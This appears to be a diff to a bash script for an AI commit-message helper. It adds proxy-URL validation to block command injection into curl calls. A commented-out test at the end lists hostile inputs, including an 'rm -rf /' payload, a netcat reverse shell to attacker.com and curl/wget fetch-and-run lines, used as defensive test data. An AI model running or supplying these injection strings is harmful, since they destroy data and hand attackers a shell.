@@ -111,6 +111,38 @@ function get_recent_commit_messages_for_ai {
     echo "$recent_commits"
 }
 
+### Function to validate and sanitize proxy URL to prevent command injection
+# $1: proxy URL to validate
+# Returns: 0 if valid, 1 if invalid
+# Sets: validated_proxy_url variable with sanitized URL
+function validate_proxy_url {
+    local proxy_url="$1"
+    validated_proxy_url=""
+    
+    if [ -z "$proxy_url" ]; then
+        return 1
+    fi
+    
+    # Remove any potential shell metacharacters and validate format
+    # Allow only safe characters: alphanumeric, dots, hyphens, underscores, colons, slashes, @, %
+    local cleaned_url=$(echo "$proxy_url" | sed 's/[^a-zA-Z0-9.:/@_%?&=-]//g')
+    
+    # Basic URL format validation for common proxy formats
+    # http://[user:pass@]host:port
+    # https://[user:pass@]host:port  
+    # socks5://[user:pass@]host:port
+    if [[ "$cleaned_url" =~ ^(https?|socks5)://([a-zA-Z0-9._%-]+(:([a-zA-Z0-9._%-]+))?@)?[a-zA-Z0-9.-]+:[0-9]+(/.*)?$ ]]; then
+        validated_proxy_url="$cleaned_url"
+        return 0
+    elif [[ "$cleaned_url" =~ ^[a-zA-Z0-9.-]+:[0-9]+$ ]]; then
+        # Allow simple host:port format (curl will assume http://)
+        validated_proxy_url="$cleaned_url"
+        return 0
+    else
+        return 1
+    fi
+}
+
 ### Function to make request to Gemini API
 # $1: prompt text
 # Returns: AI response text
@@ -142,20 +174,32 @@ function call_gemini_api {
     
     # Make API request with optional proxy
     local proxy_url=$(get_ai_proxy)
+    local safe_proxy_url=""
     local response=""
     
     if [ -n "$proxy_url" ]; then
-        # echo -e "${BLUE}Using proxy: ${proxy_url}${ENDCOLOR}" >&2
+        # Validate and sanitize proxy URL to prevent command injection
+        if ! validate_proxy_url "$proxy_url"; then
+            echo -e "${RED}Invalid proxy URL format: $proxy_url${ENDCOLOR}" >&2
+            echo -e "${YELLOW}Expected format: protocol://host:port (e.g., http://proxy.example.com:8080)${ENDCOLOR}" >&2
+            echo -e "${YELLOW}Or: host:port (e.g., proxy.example.com:8080)${ENDCOLOR}" >&2
+            return 1
+        fi
+        
+        # Use the validated proxy URL
+        safe_proxy_url="$validated_proxy_url"
+        
+        # echo -e "${BLUE}Using proxy: ${safe_proxy_url}${ENDCOLOR}" >&2
         
         # Configure curl options based on proxy type
         local proxy_opts=""
-        if [[ "$proxy_url" == socks5://* ]]; then
+        if [[ "$safe_proxy_url" == socks5://* ]]; then
             proxy_opts="--socks5-hostname"
         fi
         
         # For HTTP/0.9 proxies, start with the most permissive approach
         response=$(curl -s -X POST \
-            --proxy "$proxy_url" \
+            --proxy "$safe_proxy_url" \
             $proxy_opts \
             --http0.9 \
             --connect-timeout 30 \
@@ -167,7 +211,7 @@ function call_gemini_api {
         # If HTTP/0.9 fails, try with HTTP/1.0
         if [ $? -ne 0 ] || [ -z "$response" ]; then
             response=$(curl -s -X POST \
-                --proxy "$proxy_url" \
+                --proxy "$safe_proxy_url" \
                 $proxy_opts \
                 --http1.0 \
                 --connect-timeout 30 \
@@ -179,9 +223,9 @@ function call_gemini_api {
         
         # If still failing, try with HTTP/1.1 and auth options for HTTP proxies
         if [ $? -ne 0 ] || [ -z "$response" ]; then
-            if [[ "$proxy_url" != socks5://* ]]; then
+            if [[ "$safe_proxy_url" != socks5://* ]]; then
                 response=$(curl -s -X POST \
-                    --proxy "$proxy_url" \
+                    --proxy "$safe_proxy_url" \
                     --proxy-negotiate \
                     --anyauth \
                     --http1.1 \
@@ -207,9 +251,9 @@ function call_gemini_api {
     if [ $? -ne 0 ] || [ -z "$response" ]; then
         echo
         echo -e "${RED}Failed to connect to AI service${ENDCOLOR}" >&2
-        if [ -n "$proxy_url" ]; then
+        if [ -n "$safe_proxy_url" ]; then
             echo -e "${YELLOW}Proxy connection failed. Try:${ENDCOLOR}" >&2
-            echo -e "  • Test: ${BOLD}curl --proxy '$proxy_url' --connect-timeout 10 ifconfig.me${ENDCOLOR}" >&2
+            echo -e "  • Test: ${BOLD}curl --proxy '$safe_proxy_url' --connect-timeout 10 ifconfig.me${ENDCOLOR}" >&2
             echo -e "  • Configure different proxy with: gitb cfg proxy" >&2
         fi
         return 1
@@ -515,3 +559,45 @@ Respond with only the full commit message, nothing else."
 
     call_gemini_api "$prompt"
 }
+
+### Function to test proxy URL validation (for development/testing)
+# Uncomment and run this function to test the validation
+# function test_proxy_validation {
+#     echo "Testing proxy URL validation..."
+#     
+#     # Valid URLs - should pass
+#     local test_urls=(
+#         "http://proxy.example.com:8080"
+#         "https://proxy.example.com:8080" 
+#         "socks5://proxy.example.com:1080"
+#         "proxy.example.com:8080"
+#         "http://user:pass@proxy.example.com:8080"
+#     )
+#     
+#     # Invalid/malicious URLs - should fail
+#     local malicious_urls=(
+#         "http://proxy.com; rm -rf /; #"
+#         "proxy.com:8080 && curl malicious.com"
+#         "proxy.com:8080|nc -e /bin/sh attacker.com 4444"
+#         "\$(curl malicious.com)"
+#         "proxy.com:8080; wget evil.sh; bash evil.sh"
+#     )
+#     
+#     echo "Testing valid URLs:"
+#     for url in "${test_urls[@]}"; do
+#         if validate_proxy_url "$url"; then
+#             echo "✓ PASS: $url -> $validated_proxy_url"
+#         else
+#             echo "✗ FAIL: $url (should have passed)"
+#         fi
+#     done
+#     
+#     echo -e "\nTesting malicious URLs:"
+#     for url in "${malicious_urls[@]}"; do
+#         if validate_proxy_url "$url"; then
+#             echo "✗ SECURITY RISK: $url -> $validated_proxy_url (should have failed!)"
+#         else
+#             echo "✓ BLOCKED: $url"
+#         fi
+#     done
+# }
